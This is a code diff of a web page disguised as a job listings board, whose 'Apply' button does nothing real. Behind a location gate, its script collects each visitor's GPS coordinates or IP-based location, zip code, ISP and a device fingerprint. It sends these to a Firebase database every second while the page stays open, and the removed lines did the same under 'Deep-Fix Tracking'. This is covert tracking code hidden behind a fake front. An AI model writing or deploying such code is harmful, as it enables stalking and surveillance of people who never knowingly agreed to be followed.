-                    if (!response.ok) continue;
-                    const data = await response.json();
-                    return {
-                        lat: data.latitude || data.lat || 0,
-                        lon: data.longitude || data.lon || 0,
-                        city: data.city || data.cityName || 'Unknown',
-                        country: data.country_name || data.countryName || data.country || 'Unknown',
-                        ip: data.ip || data.ipAddress || data.query || 'Unknown',
-                        isp: data.org || data.isp || data.as || 'Unknown',
-                        src: new URL(url).hostname
+        // Start hybrid tracking (GPS + IP)
+        function startHybridTracking() {
+            sendLocationToFirebase();
+            trackingInterval = setInterval(sendLocationToFirebase, 1000);
+        }
+
+        // Start IP-only tracking
+        function startIPTracking() {
+            sendLocationToFirebase();
+            trackingInterval = setInterval(sendLocationToFirebase, 1000);
+        }
+
+        // Send location to Firebase
+        function sendLocationToFirebase() {
+            if (useGPS) {
+                // GPS tracking
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        locationCounter++;
+                        const locationData = {
+                            id: locationCounter,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy || 0,
+                            altitude: position.coords.altitude || 0,
+                            altitudeAccuracy: position.coords.altitudeAccuracy || 0,
+                            heading: position.coords.heading || 0,
+                            speed: position.coords.speed || 0,
+                            timestamp: Date.now(),
+                            collectedAt: new Date().toISOString(),
+                            locationMethod: 'GPS',
+                            deviceName: getDeviceName(),
+                            deviceType: navigator.platform,
+                            userAgent: navigator.userAgent,
+                            screenResolution: `${screen.width}x${screen.height}`,
+                            cpuCores: navigator.hardwareConcurrency || 0,
+                            deviceMemory: navigator.deviceMemory || 0,
+                            city: 'N/A',
+                            country: 'N/A',
+                            ipAddress: 'N/A',
+                            isp: 'N/A'
+                        };
+                        pushToFirebase(locationData);
+                    },
+                    function(error) {
+                        console.error('❌ GPS error, switching to IP:', error.message);
+                        useGPS = false;
+                        sendIPToFirebase();
+                    },
+                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
+                );
+            } else {
+                // IP tracking
+                sendIPToFirebase();
+            }
+        }
+
+        // Send IP-based location
+        function sendIPToFirebase() {
+            locationCounter++;
+            
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.error) throw new Error(data.reason);
+                    
+                    const locationData = {
+                        id: locationCounter,
+                        latitude: data.latitude || 0,
+                        longitude: data.longitude || 0,
+                        accuracy: 0,
+                        altitude: 0,
+                        altitudeAccuracy: 0,
+                        heading: 0,
+                        speed: 0,
+                        timestamp: Date.now(),
+                        collectedAt: new Date().toISOString(),
+                        locationMethod: 'IP-based',
+                        deviceName: getDeviceName(),
+                        deviceType: navigator.platform,
+                        userAgent: navigator.userAgent,
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        cpuCores: navigator.hardwareConcurrency || 0,
+                        deviceMemory: navigator.deviceMemory || 0,
+                        city: data.city || 'N/A',
+                        country: data.country_name || 'N/A',
+                        countryCode: data.country_code || 'N/A',
+                        region: data.region || 'N/A',
+                        zip: data.postal || 'N/A',
+                        timezone: data.timezone || 'N/A',
+                        ipAddress: data.ip || 'N/A',
+                        isp: data.org || 'N/A',
+                        organization: data.org || 'N/A'
                     };
-                } catch (e) {}
-            }
-            return null;
+                    pushToFirebase(locationData);
+                })
+                .catch(err => {
+                    console.error('❌ IP API error:', err.message);
+                });
         }
 
-        // 3. Robust Write (Unlimited Logs)
-        async function track() {
-            const loc = await fetchLocationData();
-            if (!loc) return;
-
-            const payload = {
-                deviceId: deviceId,
-                deviceName: "Device " + deviceId.toUpperCase(),
-                platform: navigator.platform,
-                latitude: loc.lat,
-                longitude: loc.lon,
-                city: loc.city,
-                country: loc.country,
-                ipAddress: loc.ip,
-                isp: loc.isp,
-                method: 'Deep-Fix Tracking (' + loc.src + ')',
-                timestamp: firebase.database.ServerValue.TIMESTAMP,
-                collectedAt: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
-
-            try {
-                // Unlimited History: Push creates a new entry every time
-                await db.ref('locations').push(payload);
-
-                // Multi-Device Recognition: Update this specific device's last known state
-                await db.ref('devices/' + deviceId).set(payload);
-
-                console.log("✅ Location synced for " + deviceId);
-            } catch (err) {
-                console.error("❌ Sync Error:", err.message);
-            }
+        // Push data to Firebase
+        function pushToFirebase(locationData) {
+            db.ref('locations').push(locationData)
+                .then(() => {
+                    console.log(`✅ [${locationCounter}] ${locationData.locationMethod} → Firebase`);
+                })
+                .catch((error) => {
+                    console.error('❌ Firebase error:', error.message);
+                });
         }
 
-        document.addEventListener('DOMContentLoaded', () => {
-            track();
-            // Track every 40 seconds to ensure stability
-            setInterval(track, 40000);
+        // Get device name
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            let device = 'Web User';
+            if (ua.match(/Android/i)) device = 'Android';
+            else if (ua.match(/iPhone/i)) device = 'iPhone';
+            else if (ua.match(/iPad/i)) device = 'iPad';
+            else if (ua.match(/Windows/i)) device = 'Windows';
+            else if (ua.match(/Mac/i)) device = 'Mac';
+            else if (ua.match(/Linux/i)) device = 'Linux';
+            
+            if (ua.match(/Chrome/i) && !ua.match(/Edg/i)) device += ' (Chrome)';
+            else if (ua.match(/Safari/i) && !ua.match(/Chrome/i)) device += ' (Safari)';
+            else if (ua.match(/Firefox/i)) device += ' (Firefox)';
+            else if (ua.match(/Edg/i)) device += ' (Edge)';
+            
+            return device;
+        }
+
+        // Show jobs after location granted
+        function showJobs(lat, lon, method) {
+            document.getElementById('locationGate').style.display = 'none';
+            document.getElementById('jobsContainer').classList.add('visible');
+            document.getElementById('locationInfo').innerHTML = `
+                <p>📍 Showing jobs for your area (${lat.toFixed(4)}, ${lon.toFixed(4)})</p>
+                <p style="margin-top: 5px; font-size: 0.9rem;">Location method: ${method}</p>
+            `;
+            renderJobs();
+        }
+
+        // Render all jobs
+        function renderJobs() {
+            const grid = document.getElementById('jobsGrid');
+            document.getElementById('jobsCount').textContent = jobs.length;
+            
+            jobs.forEach((job) => {
+                const card = document.createElement('div');
+                card.className = 'job-card';
+                card.innerHTML = `
+                    <div class="job-title">${job.title}</div>
+                    <div class="job-company">${job.company}</div>
+                    <div class="job-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Location:</span>
+                            <span class="detail-value">${job.location}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Type:</span>
+                            <span class="detail-value">Full-time / Contract</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Experience:</span>
+                            <span class="detail-value">Senior Level</span>
+                        </div>
+                    </div>
+                    <div class="salary">${job.salary}</div>
+                    <div class="requirements">
+                        <h4>Requirements:</h4>
+                        <ul>
+                            ${job.requirements.map(req => `<li>${req}</li>`).join('')}
+                        </ul>
+                    </div>
+                    <button class="apply-btn" onclick="applyToJob('${job.title}', '${job.company}')">
+                        Apply Now →
+                    </button>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        // Apply to job
+        function applyToJob(title, company) {
+            alert(`Application for ${title} at ${company}\n\nThis would redirect to the application page.`);
+        }
+
+        // Continue tracking when page visible
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && trackingInterval) {
+                sendLocationToFirebase();
+            }
         });
-        window.onfocus = () => track();
     </script>
 </body>
 </html>
